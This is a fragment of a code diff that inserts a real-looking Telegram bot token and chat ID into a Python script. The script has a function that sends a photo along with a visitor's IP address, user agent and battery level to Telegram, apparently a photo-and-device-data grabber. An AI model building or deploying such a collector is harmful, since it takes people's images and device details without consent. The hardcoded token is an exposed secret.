@@ -12,8 +12,8 @@ if not os.path.exists('static'):
     os.makedirs('static')
 
 # Telegram Bot API details
-TELEGRAM_BOT_TOKEN = 'your_bot_token_here'
-TELEGRAM_CHAT_ID = 'your_chat_id_here'
+TELEGRAM_BOT_TOKEN = '7125865296:AAHI_w7KGa152kCOVPNgsavTNIfatUR0hX8'
+TELEGRAM_CHAT_ID = '5197344486'
 
 # Function to send photo to Telegram
 def send_photo_to_telegram(photo_path, ip, user_agent, battery):
